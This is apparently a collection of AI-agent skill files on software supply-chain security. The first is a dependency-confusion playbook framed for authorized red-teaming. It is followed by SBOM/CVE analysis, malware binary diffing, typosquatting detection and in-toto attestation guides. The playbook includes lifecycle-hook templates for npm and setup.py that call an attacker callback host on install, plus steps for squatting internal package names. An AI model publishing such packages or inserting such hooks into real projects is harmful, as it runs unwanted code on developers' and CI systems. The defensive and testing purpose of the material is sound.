---
name: dependency-confusion
description: >-
  Supply-chain testing via package-manager dependency confusion: when internal package names resolve to attacker-controlled public registries, leading to malicious install and script execution. Use for npm/pip/gem/Maven/Composer/Docker manifest review and authorized red-team supply-chain exercises.
---

# SKILL: Dependency Confusion — Supply Chain Attack Playbook

> **AI LOAD INSTRUCTION**: Expert dependency-confusion methodology. Covers how private package names leak, how public registries can win version resolution, ecosystem-specific pitfalls (npm scopes, pip extra indexes, Maven repo order), recon commands, non-destructive PoC patterns (callbacks, not data exfil), and defensive controls. Pair with supply-chain recon workflows when manifests or CI caches are in scope. **Only use on systems and programs you are authorized to test.**

## 0. QUICK START

**What to look for first**

- **Manifests** listing package names that look **internal** (short unscoped names, org-specific tokens, product codenames) without a **hard-private registry lock**.
- Evidence the **same name** might exist—or be **squattable**—on a **public** registry with a **higher semver** than the private feed publishes.
- **Lockfiles** missing, stale, or not enforced in CI so `install`/`build` can drift toward public metadata.

**Fast mental model**: *If the resolver can see both private and public indexes, and version ranges allow it, the “newest” matching version may be the attacker’s.*

Routing note: if the task comes from supply-chain, repository exposure, or CI-build recon, first use `recon-for-sec` to list internal package names and possible public-registry collisions.

---

## 1. CORE CONCEPT

1. **Private packages**: An organization ships libraries only on an internal registry (or under conventions that imply “ours”), e.g. a scoped name like `@org-scope/internal-utils` or an **unscoped** name such as `acme-billing-sdk`.
2. **Attacker squats the name**: The same package name is published on a **public** registry (npmjs, PyPI, RubyGems, etc.).
3. **Resolver preference**: Many setups resolve **highest matching version** across **all configured indexes** (or merge metadata), so a public `9.9.9` can beat a private `1.2.3` if ranges allow.
4. **Execution**: Package managers run **lifecycle scripts** (npm `preinstall`/`postinstall`, setuptools entry points, etc.) → **attacker code runs** on developer laptops, CI, or production image builds.

This is a **supply-chain** class issue: impact is often **broad** (many consumers) and **silent** until build or runtime hooks fire.

---

## 2. AFFECTED ECOSYSTEMS

| Ecosystem | Typical manifest | Confusion angle |
|-----------|------------------|-----------------|
| **npm** | `package.json` | **Scoped** packages (`@scope/pkg`) are **safer** when the scope is **owned** on the registry; **unscoped** private-style names are **high risk**. Multiple registries / `.npmrc` `registry` vs per-scope `@scope:registry=` misconfiguration increases risk. |
| **pip** | `requirements.txt`, `pyproject.toml`, `setup.py` | `pip install -i` / **`--extra-index-url`** merges indexes; a public index can serve a **higher version** for the same distribution name. |
| **RubyGems** | `Gemfile` | **`source`** order and additional sources; ambiguous gem names reachable from rubygems.org. |
| **Maven** | `pom.xml` | **Repository** declaration **order** and **mirror** settings; a public repo publishing the same `groupId:artifactId` under a higher version can win if policy allows. |
| **Composer** | `composer.json` | **Packagist** is default; private packages without **`repositories`**/`canonical` discipline may collide with public names. |
| **Docker** | `FROM`, image tags | **Typosquatting** on container registries (e.g. public hub) for images with names similar to internal base images. |

---

## 3. RECONNAISSANCE

**Where internal names leak**

- Committed **`package.json`**, **`requirements.txt`**, **`Gemfile`**, **`pom.xml`**, **`composer.json`** in repos or forks.
- **JavaScript source maps**, bundled assets, or **error stack traces** referencing package paths.
- **`.npmrc`**, **`.pypirc`**, **CI logs** showing install URLs or mirror endpoints.
- **Issue trackers**, **gist snippets**, and **dependency graphs** from SBOM exports.

**Check public squatting / claimability (read-only)**

```bash
# npm — metadata for a name (unscoped)
npm view some-internal-package-name version

# npm — scoped (requires scope to exist / be readable)
npm view @some-scope/internal-lib versions --json

# PyPI — dry-run style version probe (adjust name; fails if not found)
python3 -m pip install --dry-run 'some-internal-package-name==99.99.99'

# RubyGems — query remote
gem search '^some-internal-package-name$' --remote

# Maven Central — search coordinates (example pattern)
# curl "https://search.maven.org/solrsearch/select?q=g:com.example+AND+a:internal-lib&rows=1&wt=json"
```

Routing note: after package-name enumeration, consider PoC only in authorized environments; public registry lookups themselves are usually passive recon.

---

## 4. EXPLOITATION

**Authorized testing pattern**

1. **Register** (or use a controlled namespace) the **same package name** on the public registry your target resolver can reach.
2. Publish a **higher semver** than the legitimate internal line **within the victim’s declared range** (e.g. `^1.0.0` → publish `9.9.9`).
3. Add **lifecycle hooks** that prove execution without harming hosts—prefer **DNS/HTTP callback** to a collaborator you control, **no destructive writes**.

**npm `package.json` — minimal callback-style PoC (illustrative)**

```json
{
  "name": "some-internal-package-name",
  "version": "9.9.9",
  "description": "authorized dependency-confusion PoC only",
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://YOUR_CALLBACK_HOST/poc?t='+process.env.npm_package_name)\""
  }
}
```

**npm `package.json` — shell + curl fallback (illustrative)**

```json
{
  "scripts": {
    "postinstall": "curl -fsS 'https://YOUR_CALLBACK_HOST/npm-postinstall' || true"
  }
}
```

**pip — setup hook pattern (illustrative; use only in authorized lab packages)**

```python
# setup.py (excerpt)
from setuptools import setup
from setuptools.command.install import install

class PoCInstall(install):
    def run(self):
        import urllib.request
        urllib.request.urlopen("https://YOUR_CALLBACK_HOST/pip-install")
        install.run(self)

setup(
    name="some-internal-package-name",
    version="9.9.9",
    cmdclass={"install": PoCInstall},
)
```

**Reference implementation (study / lab)**: community PoC layout and workflow similar to [`0xsapra/dependency-confusion-exploit`](https://github.com/0xsapra/dependency-confusion-exploit) — automate version bump, publish, and callback confirmation **only where you have written permission**.

---

## 5. TOOLS

| Tool | Role |
|------|------|
| [**visma-prodsec/confused**](https://github.com/visma-prodsec/confused) | Scans manifest files for dependency names that may be **claimable** on public registries (multi-ecosystem). |
| [**synacktiv/DepFuzzer**](https://github.com/synacktiv/DepFuzzer) | Automated **dependency confusion** testing workflows (use strictly in-scope). |

Run these only against **your** manifests or **authorized** engagements; do not use to squat names for unrelated third parties.

---

## 6. DEFENSE

- **npm**: Prefer **scoped** packages (`@org-scope/pkg`) with **org-owned** scopes; set **`.npmrc`** so private scopes map to private registry and **default `registry`** is not accidentally public for internal names.
- **Pinning**: **Exact versions** + **lockfiles** (`package-lock.json`, `poetry.lock`, `Gemfile.lock`, `composer.lock`) enforced in CI.
- **pip**: Avoid careless **`--extra-index-url`**; prefer **single private index** with **mirroring**, or **explicit `--index-url`** policies in CI.
- **Maven / Gradle**: Control **repository order**, use **internal mirrors**, and **block** unexpected groupIds on release pipelines.
- **Composer**: Use **`repositories`** with **`canonical: true`** for private packages; verify Packagist is not introducing unexpected vendors.
- **Defensive registration**: **Reserve** internal names on public registries (squat your own names) where policy allows.
- **Monitoring**: Tools such as **Socket.dev**, **Snyk**, or similar SBOM/supply-chain scanners to alert on **new publishers** or **version jumps** for critical packages.

---

## 7. DECISION TREE

```text
Do manifests reference package names that could be non-unique globally?
├─ NO → Dependency confusion unlikely from naming alone; pivot to typosquatting / compromised accounts.
└─ YES
    ├─ Is the private registry the ONLY source for that name (scoped + .npmrc / single index / mirror)?
    │   ├─ YES → Lower risk; still verify CI and developer machines do not override config.
    │   └─ NO → HIGH RISK
    │         ├─ Can a public registry publish a HIGHER version inside declared ranges?
    │         │   ├─ YES → Treat as exploitable in authorized tests; prove with callback PoC.
    │         │   └─ NO → Check pre-release tags, local `file:` deps, and stale lockfiles.
    │         └─ Are lifecycle scripts disabled/blocked in CI? (reduces impact, does not remove squat risk)
```

---

## Related routing

- **From `recon-for-sec`**: When doing **supply-chain reconnaissance**, cross-link leaked manifests and internal package identifiers with the checks in **Section 3** and the decision tree in **Section 7** before proposing any publish/PoC steps.

## analyzing-sbom-for-supply-chain-vulnerabilities

name: analyzing-sbom-for-supply-chain-vulnerabilities
description: 'Parses Software Bill of Materials (SBOM) in CycloneDX and SPDX JSON formats to identify supply chain vulnerabilities
  by correlating components against the NVD CVE database via the NVD 2.0 API. Builds dependency graphs, calculates risk scores,
  identifies transitive vulnerability paths, and generates compliance reports. Activates for requests involving SBOM analysis,
  software composition analysis, supply chain security assessment, dependency vulnerability scanning, CycloneDX/SPDX parsing,
  or CVE correlation.

  '
domain: cybersecurity
subdomain: supply-chain-security
tags:
- SBOM
- CycloneDX
- SPDX
- NVD
- CVE
- supply-chain
- dependency-analysis
- syft
- grype
version: 1.0.0
author: mukul975
license: Apache-2.0
atlas_techniques:
- AML.T0010
- AML.T0104
nist_ai_rmf:
- GOVERN-5.2
- MAP-1.6
- MANAGE-2.2
- GOVERN-1.1
- GOVERN-4.2
nist_csf:
- GV.SC-01
- GV.SC-03
- GV.SC-06
- GV.SC-07
---

# Analyzing SBOM for Supply Chain Vulnerabilities

## When to Use

- A new regulatory requirement (EO 14028, EU CRA) mandates SBOM analysis for software deliveries
- Security team needs to assess third-party risk by scanning vendor-provided SBOMs
- CI/CD pipeline requires automated vulnerability checks against generated SBOMs
- Incident response needs to determine if a newly disclosed CVE affects deployed software
- Procurement team requires supply chain risk assessment for a software acquisition

**Do not use** for runtime vulnerability scanning of live systems; use container scanning tools (Trivy, Grype CLI) or host-based vulnerability scanners (Nessus, Qualys) instead.

## Prerequisites

- SBOM file in CycloneDX JSON (v1.4+) or SPDX JSON (v2.3+) format
- Python 3.9+ with requests, networkx, and packaging libraries installed
- NVD API key (free, from https://nvd.nist.gov/developers/request-an-api-key) for higher rate limits
- Network access to NVD API (https://services.nvd.nist.gov/rest/json/cves/2.0)
- Optionally: syft for SBOM generation, grype for cross-validation

## Workflow

### Step 1: Generate SBOM (if not provided)

Use syft to create an SBOM from a container image or project directory:

```bash
# Generate CycloneDX JSON from a container image
syft alpine:latest -o cyclonedx-json > sbom-cyclonedx.json

# Generate SPDX JSON from a project directory
syft dir:/path/to/project -o spdx-json > sbom-spdx.json

# Generate from a running container
syft docker:my-app-container -o cyclonedx-json > sbom.json
```

Syft supports over 30 package ecosystems including npm, PyPI, Maven, Go modules, apt, apk, and RPM. The generated SBOM includes package names, versions, licenses, CPE identifiers, and PURL (Package URL) references.

### Step 2: Parse SBOM and Extract Components

Parse the SBOM to extract all software components with their identifiers:

**CycloneDX JSON Structure:**
```json
{
  "bomFormat": "CycloneDX",
  "specVersion": "1.5",
  "components": [
    {
      "type": "library",
      "name": "lodash",
      "version": "4.17.20",
      "purl": "pkg:npm/lodash@4.17.20",
      "cpe": "cpe:2.3:a:lodash:lodash:4.17.20:*:*:*:*:*:*:*",
      "licenses": [{"license": {"id": "MIT"}}]
    }
  ],
  "dependencies": [
    {"ref": "pkg:npm/express@4.18.2", "dependsOn": ["pkg:npm/lodash@4.17.20"]}
  ]
}
```

**SPDX JSON Structure:**
```json
{
  "spdxVersion": "SPDX-2.3",
  "packages": [
    {
      "name": "lodash",
      "versionInfo": "4.17.20",
      "externalRefs": [
        {"referenceType": "purl", "referenceLocator": "pkg:npm/lodash@4.17.20"},
        {"referenceType": "cpe23Type", "referenceLocator": "cpe:2.3:a:lodash:lodash:4.17.20:*:*:*:*:*:*:*"}
      ],
      "licenseConcluded": "MIT"
    }
  ],
  "relationships": [
    {"spdxElementId": "SPDXRef-express", "relatedSpdxElement": "SPDXRef-lodash",
     "relationshipType": "DEPENDS_ON"}
  ]
}
```

### Step 3: Correlate Components with NVD CVE Database

Query the NVD 2.0 API to find known vulnerabilities for each component:

```python
import requests

NVD_API = "https://services.nvd.nist.gov/rest/json/cves/2.0"

def search_cves_by_cpe(cpe_name, api_key=None):
    params = {"cpeName": cpe_name, "resultsPerPage": 50}
    headers = {"apiKey": api_key} if api_key else {}
    resp = requests.get(NVD_API, params=params, headers=headers, timeout=30)
    resp.raise_for_status()
    return resp.json().get("vulnerabilities", [])

def search_cves_by_keyword(keyword, version=None, api_key=None):
    params = {"keywordSearch": keyword, "resultsPerPage": 50}
    headers = {"apiKey": api_key} if api_key else {}
    resp = requests.get(NVD_API, params=params, headers=headers, timeout=30)
    resp.raise_for_status()
    return resp.json().get("vulnerabilities", [])
```

The NVD API supports searching by CPE name (most precise), keyword, CVE ID, and date ranges. Rate limits: 5 requests/30 seconds without API key, 50 requests/30 seconds with key.

### Step 4: Build Dependency Graph and Identify Transitive Risks

Construct a directed graph of dependencies to trace vulnerability propagation:

```python
import networkx as nx

def build_dependency_graph(sbom):
    G = nx.DiGraph()
    # Add nodes for each component
    for comp in sbom["components"]:
        G.add_node(comp["purl"], name=comp["name"], version=comp["version"])
    # Add edges from dependency relationships
    for dep in sbom.get("dependencies", []):
        for child in dep.get("dependsOn", []):
            G.add_edge(dep["ref"], child)
    return G
```

Transitive dependency analysis identifies components that are not directly included but are pulled in through dependency chains. A vulnerability in a deeply nested transitive dependency (e.g., 4 levels deep) still represents risk but may be harder to remediate.

Key graph metrics for risk assessment:
- **In-degree**: How many components depend on this one (high in-degree = high blast radius)
- **Shortest path to root**: Distance from application entry point (closer = more exploitable)
- **Betweenness centrality**: Components that sit on many dependency paths (bottleneck risk)

### Step 5: Calculate Risk Scores

Aggregate vulnerability data into component and overall risk scores:

```
Risk Score Calculation:
━━━━━━━━━━━━━━━━━━━━━━
Component Risk = max(CVSS scores of all CVEs affecting the component)

Weighted Risk = Component Risk * Dependency Factor
  where Dependency Factor = 1.0 + (0.1 * in_degree)
  (more dependents = higher organizational impact)

Overall SBOM Risk = weighted average of all component risks
  weighted by dependency centrality

Risk Levels:
  CRITICAL: CVSS >= 9.0 or known exploited (CISA KEV)
  HIGH:     CVSS >= 7.0
  MEDIUM:   CVSS >= 4.0
  LOW:      CVSS < 4.0
```

### Step 6: Cross-Validate with Grype

Use grype to independently scan the SBOM and compare findings:

```bash
# Scan CycloneDX SBOM with grype
grype sbom:sbom-cyclonedx.json -o json > grype-results.json

# Scan SPDX SBOM
grype sbom:sbom-spdx.json -o table

# Filter by severity
grype sbom:sbom-cyclonedx.json --only-fixed --fail-on critical
```

Grype pulls vulnerability data from NVD, GitHub Security Advisories, Alpine SecDB, Red Hat, Debian, Ubuntu, Amazon Linux, and Oracle security databases, providing broader coverage than NVD alone.

### Step 7: Generate Compliance Report

Produce a structured report suitable for regulatory compliance:

```
SBOM VULNERABILITY ANALYSIS REPORT
====================================
SBOM File:         app-sbom-cyclonedx.json
Format:            CycloneDX v1.5
Analysis Date:     2026-03-19
Total Components:  247
Total Dependencies: 1,842 (direct: 34, transitive: 213)

VULNERABILITY SUMMARY
  Critical:  3 components / 5 CVEs
  High:      11 components / 18 CVEs
  Medium:    27 components / 41 CVEs
  Low:       8 components / 12 CVEs

CRITICAL FINDINGS
1. lodash@4.17.20
   CVE-2021-23337 (CVSS 7.2) - Command Injection via template
   CVE-2020-28500 (CVSS 5.3) - ReDoS in trimEnd
   Dependents: 14 components (high blast radius)
   Fix: Upgrade to 4.17.21+

2. log4j-core@2.14.1
   CVE-2021-44228 (CVSS 10.0) - Log4Shell RCE [CISA KEV]
   CVE-2021-45046 (CVSS 9.0) - Incomplete fix bypass
   Dependents: 8 components
   Fix: Upgrade to 2.17.1+

DEPENDENCY GRAPH RISKS
  Most depended-on: core-util@1.2.3 (47 dependents)
  Deepest chain: app -> framework -> adapter -> codec -> zlib (5 levels)
  Bottleneck components: 3 components on >50% of dependency paths

LICENSE COMPLIANCE
  Copyleft licenses found: 2 (GPL-3.0 in libxml2, AGPL-3.0 in mongodb-driver)
  Review required for commercial distribution
```

## Key Concepts

| Term | Definition |
|------|------------|
| **SBOM** | Software Bill of Materials; a formal inventory of all components, libraries, and dependencies in a software product |
| **CycloneDX** | OWASP-maintained SBOM standard supporting JSON, XML, and protobuf formats with dependency graph and vulnerability data |
| **SPDX** | Linux Foundation SBOM standard focused on license compliance with support for package, file, and snippet-level detail |
| **PURL** | Package URL; a standardized scheme for identifying software packages across ecosystems (e.g., pkg:npm/lodash@4.17.21) |
| **CPE** | Common Platform Enumeration; NIST naming scheme for IT products used to correlate with NVD CVE data |
| **NVD** | National Vulnerability Database; US government repository of vulnerability data indexed by CVE identifiers |
| **Transitive Dependency** | A dependency not directly declared but pulled in through the dependency chain of direct dependencies |
| **CISA KEV** | CISA Known Exploited Vulnerabilities catalog; CVEs confirmed to be actively exploited in the wild |

## Tools & Systems

- **syft** (Anchore): Open-source SBOM generator supporting 30+ package ecosystems and CycloneDX/SPDX output
- **grype** (Anchore): Vulnerability scanner that accepts SBOMs as input and correlates against multiple advisory databases
- **cyclonedx-python-lib**: Python library for creating, parsing, and validating CycloneDX SBOMs programmatically
- **lib4sbom**: Python library for parsing both SPDX and CycloneDX format SBOMs
- **nvdlib**: Python wrapper for the NVD 2.0 API supporting CVE and CPE queries with rate limit management
- **OWASP Dependency-Track**: Platform for continuous SBOM analysis, vulnerability tracking, and policy enforcement

## Common Scenarios

### Scenario: Assessing Vendor Software After Log4Shell Disclosure

**Context**: After the Log4Shell (CVE-2021-44228) disclosure, the security team needs to determine which vendor-supplied applications contain vulnerable versions of log4j. Several vendors have provided SBOMs per contractual requirements.

**Approach**:
1. Collect all vendor SBOMs (CycloneDX or SPDX JSON format)
2. Parse each SBOM and search for log4j-core components with versions < 2.17.1
3. Query NVD API for the specific CVEs (CVE-2021-44228, CVE-2021-45046, CVE-2021-45105)
4. Build dependency graphs to identify which application components depend on log4j
5. Calculate blast radius: how many services and endpoints are exposed
6. Generate prioritized remediation report sorted by exposure and business criticality
7. Cross-validate findings with grype scan of the same SBOMs

**Pitfalls**:
- Vendor SBOMs may be incomplete, missing shaded/bundled JAR files that embed log4j
- SPDX and CycloneDX version differences may affect parser compatibility
- NVD API rate limits can slow analysis when scanning hundreds of components without an API key
- CPE names in SBOMs may not exactly match NVD entries, requiring fuzzy matching
- Transitive dependencies may include log4j even when it is not a direct dependency

## analyzing-supply-chain-malware-artifacts

name: analyzing-supply-chain-malware-artifacts
description: 调查供应链攻击工件，包括被木马化的软件更新、被攻陷的构建流水线和侧载的依赖项，以识别入侵向量和攻陷范围。
domain: cybersecurity
subdomain: malware-analysis
tags: [supply-chain, malware-analysis, trojanized-software, solarwinds, 3cx, dependency-confusion, software-integrity]
version: "1.0"
author: mahipal
license: Apache-2.0
---
# 分析供应链恶意软件工件

## 概述

供应链攻击通过破坏合法软件分发渠道，借助受信任的更新机制投递恶意软件。典型案例包括 SolarWinds SUNBURST（2020 年，影响 18,000 多个客户）、3CX SmoothOperator（2023 年，一起源自 Trading Technologies 的级联供应链攻击）以及大量 npm/PyPI 包投毒活动。分析工作涉及：将木马化二进制文件与合法版本进行比对、识别构建工件中的注入代码、检查代码签名异常，以及追踪从初始攻陷到载荷投递的感染链。截至 2025 年，供应链攻击占所有违规事件的 30%，较前几年增加了 100%。

## 前置条件

- Python 3.9+，安装 `pefile`、`ssdeep`、`hashlib`
- 二进制对比工具（BinDiff、Diaphora）
- 代码签名验证工具（sigcheck、codesign）
- 软件成分分析（SCA）工具
- 访问合法软件版本以供比对
- 包仓库监控（npm、PyPI、NuGet）

## 操作步骤

### 步骤 1：二进制比对分析

```python
#!/usr/bin/env python3
"""比对木马化二进制文件与合法版本。"""
import hashlib
import pefile
import sys
import json


def compare_pe_files(legitimate_path, suspect_path):
    """比对合法版本与可疑版本之间的 PE 文件结构。"""
    legit_pe = pefile.PE(legitimate_path)
    suspect_pe = pefile.PE(suspect_path)

    report = {"differences": [], "suspicious_sections": [], "import_changes": []}

    # 比对节
    legit_sections = {s.Name.rstrip(b'\x00').decode(): {
        "size": s.SizeOfRawData,
        "entropy": s.get_entropy(),
        "characteristics": s.Characteristics,
    } for s in legit_pe.sections}

    suspect_sections = {s.Name.rstrip(b'\x00').decode(): {
        "size": s.SizeOfRawData,
        "entropy": s.get_entropy(),
        "characteristics": s.Characteristics,
    } for s in suspect_pe.sections}

    # 查找新增或已修改的节
    for name, props in suspect_sections.items():
        if name not in legit_sections:
            report["suspicious_sections"].append({
                "name": name, "reason": "合法版本中不存在的新节",
                "size": props["size"], "entropy": round(props["entropy"], 2),
            })
        elif abs(props["size"] - legit_sections[name]["size"]) > 1024:
            report["suspicious_sections"].append({
                "name": name, "reason": "节大小发生显著变化",
                "legit_size": legit_sections[name]["size"],
                "suspect_size": props["size"],
            })

    # 比对导入
    legit_imports = set()
    if hasattr(legit_pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in legit_pe.DIRECTORY_ENTRY_IMPORT:
            for imp in entry.imports:
                if imp.name:
                    legit_imports.add(f"{entry.dll.decode()}!{imp.name.decode()}")

    suspect_imports = set()
    if hasattr(suspect_pe, 'DIRECTORY_ENTRY_IMPORT'):
        for entry in suspect_pe.DIRECTORY_ENTRY_IMPORT:
            for imp in entry.imports:
                if imp.name:
                    suspect_imports.add(f"{entry.dll.decode()}!{imp.name.decode()}")

    new_imports = suspect_imports - legit_imports
    if new_imports:
        report["import_changes"] = list(new_imports)

    # 检查代码签名
    report["legit_signed"] = bool(legit_pe.OPTIONAL_HEADER.DATA_DIRECTORY[4].Size)
    report["suspect_signed"] = bool(suspect_pe.OPTIONAL_HEADER.DATA_DIRECTORY[4].Size)

    return report


def hash_file(filepath):
    """计算文件的多种哈希值。"""
    hashes = {}
    with open(filepath, 'rb') as f:
        data = f.read()
    for algo in ['md5', 'sha1', 'sha256']:
        h = hashlib.new(algo)
        h.update(data)
        hashes[algo] = h.hexdigest()
    return hashes


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"用法：{sys.argv[0]} <legitimate_binary> <suspect_binary>")
        sys.exit(1)
    report = compare_pe_files(sys.argv[1], sys.argv[2])
    print(json.dumps(report, indent=2, ensure_ascii=False))
```

## 验证标准

- 通过二进制对比识别出被木马化的组件
- 注入的代码被隔离并单独分析
- 代码签名异常已记录
- 从构建工件重建感染时间线
- 评估对受影响系统的下游影响范围
- 提取 IoC 用于检测和封锁

## 参考资料

- [ReversingLabs - 3CX 供应链分析](https://www.reversinglabs.com/blog/what-went-wrong-with-the-3cx-software-supply-chain-attack-and-how-it-could-have-been-prevented)
- [Fortinet - SolarWinds 供应链攻击](https://www.fortinet.com/resources/cyberglossary/solarwinds-cyber-attack)
- [Picus - 3CX SmoothOperator 分析](https://www.picussecurity.com/resource/blog/smoothoperator-analysis-of-3cxdesktopapp-supply-chain-attack)
- [MITRE ATT&CK T1195 - 供应链攻陷](https://attack.mitre.org/techniques/T1195/)

## performing-supply-chain-attack-simulation

name: performing-supply-chain-attack-simulation
description: 模拟和检测软件供应链攻击，包括通过 Levenshtein 距离检测域名抢注（Typosquatting）、针对私有注册表的依赖混淆（Dependency Confusion）测试、使用 pip 进行包哈希验证，以及使用 pip-audit 扫描已知漏洞。
domain: cybersecurity
subdomain: application-security
tags: [supply-chain, typosquatting, dependency-confusion, package-verification, pip-audit, PyPI, software-composition-analysis]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# 执行供应链攻击模拟

## 概述

软件供应链攻击通过以下方式利用对包注册表的信任：域名抢注（注册与流行包相似的名称）、依赖混淆（发布与私有名称匹配的高版本公共包），以及被入侵的包分发。本技能通过以下方式检测这些攻击向量：计算包名与流行 PyPI 包之间的 Levenshtein 距离、通过 SHA-256 哈希比较验证包完整性、使用 pip-audit 扫描已知 CVE，以及测试依赖解析顺序的混淆漏洞。

## 前置条件

- Python 3.9+ 及 `pip-audit`、`Levenshtein`、`requests`
- 访问 PyPI JSON API（https://pypi.org/pypi/{package}/json）
- 用于获取包元数据的网络访问

## 关键检测领域

1. **域名抢注（Typosquatting）** — 使用编辑距离阈值将包名与顶级 PyPI 包进行比较
2. **依赖混淆（Dependency Confusion）** — 检查内部包名是否以更高版本号存在于公共 PyPI 上
3. **哈希验证** — 下载包并验证 SHA-256 摘要是否与已发布哈希匹配
4. **漏洞扫描** — 对照 OSV 和 PyPA 咨询数据库审计已安装的包
5. **元数据异常** — 标记具有可疑作者邮件、缺少主页或首次上传日期非常近的包

## 输出

JSON 报告，包含每个包的风险评分、检测到的攻击向量、哈希验证结果和 CVE 发现。

## implementing-supply-chain-security-with-in-toto

name: implementing-supply-chain-security-with-in-toto
description: 使用 in-toto 框架为容器构建流程实施软件供应链（Supply Chain）完整性验证，在 CI/CD 流水线各步骤创建经过密码学签名的证明（Attestation）。
domain: cybersecurity
subdomain: container-security
tags: [in-toto, supply-chain-security, attestation, slsa, sigstore, container-security, cncf, provenance, sbom]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# 使用 in-toto 实施供应链安全

## 概述

in-toto 是 CNCF 的一个毕业项目，用于确保软件供应链（Software Supply Chain）从启动到最终用户安装的完整性。它通过在每个步骤生成经过密码学签名的证明（attestation，也称"链接元数据"），创建整个软件开发生命周期的可验证记录，以证明发生了什么、由谁执行以及产生了哪些工件。在容器环境中，in-toto 可验证部署到 Kubernetes 的镜像是否遵循了已批准的构建流程且未被篡改。

## 前置条件

- Python 3.8+ 或 Go 运行时（用于 in-toto 客户端库）
- GPG 或 Ed25519 密钥（用于签署证明）
- 容器构建流水线（Docker、Buildah 或 Kaniko）
- 容器镜像仓库（Docker Hub、ECR、GCR 或 Harbor）
- Kubernetes 集群（用于部署验证）

## 核心概念

### 供应链布局（Layout）

布局是核心策略文档，定义以下内容：

- **步骤（Steps）**：供应链中的有序操作（克隆、构建、测试、打包、推送）
- **执行者（Functionaries）**：执行每个步骤的授权实体（人员或 CI 系统）
- **检查（Inspections）**：验证时在客户端执行的验证检查
- **预期工件（Expected artifacts）**：步骤之间的输入/输出关系

```python
from in_toto.models.layout import Layout, Step, Inspection
from securesystemslib.interface import import_ed25519_privatekey_from_file

# 创建供应链布局
layout = Layout()
layout.set_relative_expiration(months=3)

# 定义代码克隆步骤
step_clone = Step(name="clone")
step_clone.expected_materials = []
step_clone.expected_products = [["CREATE", "src/*"]]
step_clone.pubkeys = [clone_functionary_keyid]
step_clone.expected_command = ["git", "clone"]
step_clone.threshold = 1

# 定义构建步骤
step_build = Step(name="build")
step_build.expected_materials = [["MATCH", "src/*", "WITH", "PRODUCTS", "FROM", "clone"]]
step_build.expected_products = [["CREATE", "image.tar"]]
step_build.pubkeys = [build_functionary_keyid]
step_build.expected_command = ["docker", "build"]
step_build.threshold = 1

# 定义扫描步骤
step_scan = Step(name="scan")
step_scan.expected_materials = [["MATCH", "image.tar", "WITH", "PRODUCTS", "FROM", "build"]]
step_scan.expected_products = [["CREATE", "scan-report.json"]]
step_scan.pubkeys = [scan_functionary_keyid]
step_scan.threshold = 1

layout.steps = [step_clone, step_build, step_scan]
```

### 链接元数据（Link Metadata）

每个步骤执行都会生成包含以下内容的链接文件：

- 消耗的材料（带哈希的输入工件）
- 创建的产品（带哈希的输出工件）
- 执行的命令
- 执行者的密码学签名

### 验证流程

在部署时，验证器会检查：
1. 所有必需步骤已执行
2. 每个步骤均由授权执行者签署
3. 步骤间的工件哈希正确链接
4. 步骤间未发生未授权修改

## 实现步骤

### 步骤 1：生成签名密钥

```bash
# 为每个执行者生成 Ed25519 密钥对
mkdir -p keys

# 项目所有者密钥（用于签署布局）
in-toto-keygen --type ed25519 keys/owner

# CI 构建器密钥
in-toto-keygen --type ed25519 keys/builder

# 安全扫描器密钥
in-toto-keygen --type ed25519 keys/scanner
```

### 步骤 2：创建供应链布局

```python
#!/usr/bin/env python3
"""生成容器构建的 in-toto 供应链布局。"""

from in_toto.models.layout import Layout, Step, Inspection
from in_toto.models.metadata import Envelope
from securesystemslib.signer import CryptoSigner
from securesystemslib.interface import import_ed25519_publickey_from_file

def create_container_build_layout():
    layout = Layout()
    layout.set_relative_expiration(months=6)

    # 加载执行者公钥
    builder_key = import_ed25519_publickey_from_file("keys/builder.pub")
    scanner_key = import_ed25519_publickey_from_file("keys/scanner.pub")

    layout.keys = {
        builder_key["keyid"]: builder_key,
        scanner_key["keyid"]: scanner_key,
    }

    # 步骤 1：源码检出
    checkout = Step(name="checkout")
    checkout.expected_materials = []
    checkout.expected_products = [
        ["CREATE", "Dockerfile"],
        ["CREATE", "src/*"],
        ["CREATE", "requirements.txt"],
    ]
    checkout.pubkeys = [builder_key["keyid"]]
    checkout.threshold = 1

    # 步骤 2：构建容器镜像
    build = Step(name="build")
    build.expected_materials = [
        ["MATCH", "Dockerfile", "WITH", "PRODUCTS", "FROM", "checkout"],
        ["MATCH", "src/*", "WITH", "PRODUCTS", "FROM", "checkout"],
    ]
    build.expected_products = [["CREATE", "image-digest.txt"]]
    build.pubkeys = [builder_key["keyid"]]
    build.threshold = 1

    # 步骤 3：安全扫描
    scan = Step(name="scan")
    scan.expected_materials = [
        ["MATCH", "image-digest.txt", "WITH", "PRODUCTS", "FROM", "build"]
    ]
    scan.expected_products = [
        ["CREATE", "vulnerability-report.json"],
        ["CREATE", "sbom.json"],
    ]
    scan.pubkeys = [scanner_key["keyid"]]
    scan.threshold = 1

    # 检查：验证无严重漏洞
    inspect_vulns = Inspection(name="verify-no-critical-vulns")
    inspect_vulns.expected_materials = [
        ["MATCH", "vulnerability-report.json", "WITH", "PRODUCTS", "FROM", "scan"]
    ]
    inspect_vulns.run = [
        "python", "-c",
        "import json,sys; r=json.load(open('vulnerability-report.json')); "
        "sys.exit(1) if any(v['severity']=='CRITICAL' for v in r.get('vulnerabilities',[])) else sys.exit(0)"
    ]

    layout.steps = [checkout, build, scan]
    layout.inspect = [inspect_vulns]

    return layout

if __name__ == "__main__":
    layout = create_container_build_layout()
    # 使用所有者密钥签署并保存
    owner_signer = CryptoSigner.from_priv_key_uri("file:keys/owner")
    envelope = Envelope.from_signable(layout)
    envelope.create_signature(owner_signer)
    envelope.dump("root.layout")
    print("布局已创建并签署：root.layout")
```

### 步骤 3：记录流水线步骤

```bash
# 在 CI/CD 流水线中记录每个步骤

# 步骤 1：检出
in-toto-run --step-name checkout \
  --key keys/builder \
  --products Dockerfile src/* requirements.txt \
  -- git clone https://github.com/org/app.git .

# 步骤 2：构建
in-toto-run --step-name build \
  --key keys/builder \
  --materials Dockerfile src/* \
  --products image-digest.txt \
  -- bash -c "docker build -t app:latest . && docker inspect --format='{{.Id}}' app:latest > image-digest.txt"

# 步骤 3：扫描
in-toto-run --step-name scan \
  --key keys/scanner \
  --materials image-digest.txt \
  --products vulnerability-report.json sbom.json \
  -- bash -c "trivy image --format json app:latest > vulnerability-report.json && syft app:latest -o json > sbom.json"
```

